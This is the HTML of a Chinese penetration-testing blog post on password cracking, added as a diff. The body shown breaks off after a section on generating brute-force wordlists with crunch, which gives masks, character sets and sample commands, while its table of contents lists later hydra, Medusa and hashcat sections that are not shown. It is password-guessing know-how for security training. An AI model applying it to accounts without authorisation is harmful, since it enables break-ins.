@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="密码破解">
+<meta property="og:url" content="https://z9m8r8.github.io/2022/08/17/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-08-17T07:16:00.000Z">
+<meta property="article:modified_time" content="2023-12-23T13:42:15.743Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="字典">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2022/08/17/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2022/08/17/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","path":"2022/08/17/密码破解/","title":"密码破解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>密码破解 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95"><span class="nav-text">1. 密码破解方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90"><span class="nav-text">2. 字典生成</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E7%A9%BA%E9%97%B4%E5%AD%97%E7%AC%A6%E7%88%86%E7%A0%B4"><span class="nav-text">1、键盘空间字符爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crunch-%E4%BB%8B%E7%BB%8D%E9%80%9A%E7%94%A8"><span class="nav-text">2、crunch 介绍【通用】</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F"><span class="nav-text">（1）基本格式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">（2）示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E9%9B%86-charset.lst-%E8%87%AA%E5%B8%A6"><span class="nav-text">（3）字符集
+charset.lst 【自带】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0-p%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6"><span class="nav-text">（4）参数：-p【无重复字符】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0-q"><span class="nav-text">（5）参数：-q</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0-t%E6%8C%87%E5%AE%9A%E5%AD%97%E5%85%B8%E7%BB%84%E6%88%90%E8%A7%84%E5%88%99"><span class="nav-text">（6）参数：-t【指定字典组成规则】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0-z%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9"><span class="nav-text">（7）参数：-z【输出文件压缩】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E7%A4%BA%E4%BE%8B"><span class="nav-text">（8）综合示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%84%E5%90%88%E5%BA%94%E7%94%A8"><span class="nav-text">（9）组合应用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cupp-%E4%BB%8B%E7%BB%8D%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%93%E5%B1%9E%E5%AD%97%E5%85%B8"><span class="nav-text">3、CUPP 介绍【个人信息专属字典】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cewl-%E4%BB%8B%E7%BB%8D%E7%BD%91%E7%AB%99"><span class="nav-text">4、cewl 介绍【网站】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#johnjtr%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99"><span class="nav-text">5、John&#x2F;JTR【基于自定义规则】</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E9%BB%98%E8%AE%A4%E7%9A%84list.ruleswordlist-%E5%90%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99"><span class="nav-text">（1）在默认的[List.Rules:Wordlist]
+后自定义规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B0%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E8%A7%84%E5%88%99%E9%9B%86"><span class="nav-text">（2）新建自己的规则集</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-text">3. 在线密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hydra-%E4%BB%8B%E7%BB%8D"><span class="nav-text">1、hydra 介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#windowswin2003%E4%B8%BA%E4%BE%8B-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-text">（1）windows【win2003为例】
+密码破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-text">（2）Linux 密码破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2-xhydra"><span class="nav-text">（3）图形界面 xhydra</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http%E8%A1%A8%E5%8D%95%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81dvwa%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3%E4%B8%BA%E4%BE%8B"><span class="nav-text">（4）HTTP表单身份认证【DVWA靶机破解为例】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pw-inspector%E5%AD%97%E5%85%B8%E7%AD%9B%E9%80%89%E5%B7%A5%E5%85%B7"><span class="nav-text">（5）pw-inspector【字典筛选工具】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%95%88%E7%8E%87"><span class="nav-text">（6）密码破解效率</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hydra%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="nav-text">（7）Hydra的缺点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medusa-%E4%BB%8B%E7%BB%8D"><span class="nav-text">2、Medusa 介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#medusa-%E7%9A%84%E7%89%B9%E7%82%B9"><span class="nav-text">（1）Medusa 的特点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84%E7%A0%B4%E8%A7%A3%E6%A8%A1%E5%9D%97"><span class="nav-text">（2）支持的破解模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="nav-text">（3）基本用法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#windows-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E4%B8%BA%E4%BE%8B"><span class="nav-text">（4）Windows
+密码破解【文件共享为例】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3ssh%E6%9C%8D%E5%8A%A1%E4%B8%BA%E4%BE%8B"><span class="nav-text">（5）Linux
+密码破解【SSH服务为例】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E7%A0%B4%E8%A7%A3owasp-webgoat%E4%B8%BA%E4%BE%8B"><span class="nav-text">（6）网站访问破解【OWASP
+WebGoat为例】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http-%E7%99%BB%E5%BD%95%E8%A1%A8%E5%8D%95%E7%A0%B4%E8%A7%A3-dvwa%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3%E4%B8%BA%E4%BE%8B"><span class="nav-text">（7）HTTP
+登录表单破解【 DVWA靶机破解为例】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-text">4. 离线密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hash-%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7"><span class="nav-text">1、HASH 识别工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-hash%E8%8E%B7%E5%8F%96%E5%B7%A5%E5%85%B7"><span class="nav-text">2、Windows
+HASH获取工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#oclhashcat"><span class="nav-text">5、oclhashcat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rainbowcrack"><span class="nav-text">6、RainbowCrack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#john"><span class="nav-text">7、John</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3linux-%E7%B3%BB%E7%BB%9F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="nav-text">（1）破解Linux 系统账号密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3windows-%E5%AF%86%E7%A0%81"><span class="nav-text">（2）破解windows 密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#johnny"><span class="nav-text">（3）Johnny</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ophcrack%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2"><span class="nav-text">8、Ophcrack【图形界面】</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2022/08/17/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="密码破解 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          密码破解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-08-17 15:16:00" itemprop="dateCreated datePublished" datetime="2022-08-17T15:16:00+08:00">2022-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-12-23 21:42:15" itemprop="dateModified" datetime="2023-12-23T21:42:15+08:00">2023-12-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">Kail Linux渗透测试</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">密码破解</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">密码破解</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>20 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="密码破解方法">1. 密码破解方法</h2>
+<ul>
+<li><strong>人工猜解</strong></li>
+<li><strong>垃圾桶工程</strong></li>
+<li><strong>被动信息收集</strong></li>
+<li><strong>基于字典暴力破解(主流)</strong></li>
+<li><strong>键盘空间字符暴破</strong></li>
+<li><strong>字典</strong></li>
+<li><strong>用户密码变型</strong></li>
+<li><strong>基于cewl的结果进行密码变型</strong></li>
+<li><strong>末尾增加数字串</strong></li>
+<li><strong>字母大小写变化</strong></li>
+<li><strong>字母与符号互相转换</strong></li>
+<li><strong>字母与数字互相转换</strong></li>
+<li><strong>P@$$w02d【password】</strong></li>
+<li><strong>保存有用户名和密码的文本文件位置</strong></li>
+<li><strong>/usr/share/wordlist</strong></li>
+<li><strong>/usr/share/wfuzz/wordlist</strong></li>
+<li><strong>/usr/share/seclists【seclists含有渗透测试可以用到的各种字典，但是有些Kali
+Linux版本默认并没有安装该字典，可自行安装】</strong></li>
+</ul>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817111803929-915088027.png" /></strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817112057967-219834813.png" /></p>
+<h2 id="字典生成">2. 字典生成</h2>
+<h3 id="键盘空间字符爆破">1、键盘空间字符爆破</h3>
+<ul>
+<li><strong>全键盘空间字符</strong></li>
+<li><strong>部分键盘空间字符(基于规则)</strong></li>
+<li><strong>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</strong></li>
+</ul>
+<h3 id="crunch-介绍通用">2、crunch 介绍【通用】</h3>
+<h4 id="基本格式">（1）基本格式</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch &lt;min-len&gt; &lt; max-len&gt; [ &lt;charset string&gt;] [options]</span><br></pre></td></tr></table></figure>
+<p><strong>注， <charset string> 默认是小写字符</strong></p>
+<h4 id="示例">（2）示例</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 6  1234567890 -o START -d 2 -b 1mb / -c 100</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>-b 按大小分割字典文件 (kb/kib、 mb/mib、 gb/gib
+)</strong></li>
+<li><strong>-c 每个字典的行数</strong></li>
+<li><strong>以上两个参数必须与-o START结合使用</strong></li>
+<li><strong>-d 同一字符连贯出现数量(11/aa)</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817113830579-2057969004.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817113919410-547934738.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817115456704-403593465.png" /></p>
+<h4 id="字符集-charset.lst-自带">（3）字符集
+<strong>charset.lst</strong> 【自带】</h4>
+<p>官方提供了可能的字符集组合【见下图】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817115640575-558707801.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o test.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817115835458-255699690.png" /></p>
+<h4 id="参数-p无重复字符">（4）参数：-p【无重复字符】</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 1 -p 01234 | more</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>对 -p
+指定的单个字符串【以每个字符为基本单位】或多个字符串【以每个字符串为基本单位】进行排列【该顺序】</strong></li>
+<li><strong>必须是最后个参数</strong></li>
+<li><strong>此时最大、最小字符长度失效，但必须存在</strong></li>
+<li><strong>与-S参数不兼容( -S指定起始字符串)</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817140516261-1264093592.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817144614445-264471305.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 0123456789 -s 9900</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817141126077-1120943917.png" /></p>
+<h4 id="参数-q">（5）参数：-q</h4>
+<p>读取文件中每行内容作为基本字符生成字典</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 1 -q 1.txt </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817141503689-304147484.png" /></p>
+<h4 id="参数-t指定字典组成规则">（6）参数：-t【指定字典组成规则】</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 6 -t @,%%^^ | more</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>-t 相当于指定掩码</strong></li>
+<li><strong>@ ：小写字母 lalpha</strong></li>
+<li><strong>,：大写字母 ualpha</strong></li>
+<li><strong>%：数字 numeric</strong></li>
+<li><strong>^ ：符号【特殊字符，如![ &amp;%$@】 symbols</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817142437340-1342009731.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817142834212-1811182435.png" /></p>
+<h4 id="参数-z输出文件压缩">（7）参数：-z【输出文件压缩】</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -t @,%^ -o <span class="built_in">test</span> -z 7z</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其他压缩格式：gzip、bzip2、lzma</li>
+<li>7z压缩比率最大</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817143435760-1254206411.png" /></p>
+<h4 id="综合示例">（8）综合示例</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o w.txt -t @d@@ -s cdab</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817144259309-1522827353.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817144128153-2093734673.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 5 5 abc DEF + \!@<span class="comment"># -t ,@^%,</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>+ 占位符</strong></li>
+<li><strong> 转义符【空格、符号】，双斜杠可将  包含进去</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817144935075-1543910669.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 5 5 -t ddd%% -p dog <span class="built_in">cat</span> bird</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>任何不同于-p参数指定的值都是占位符</strong></li>
+</ul>
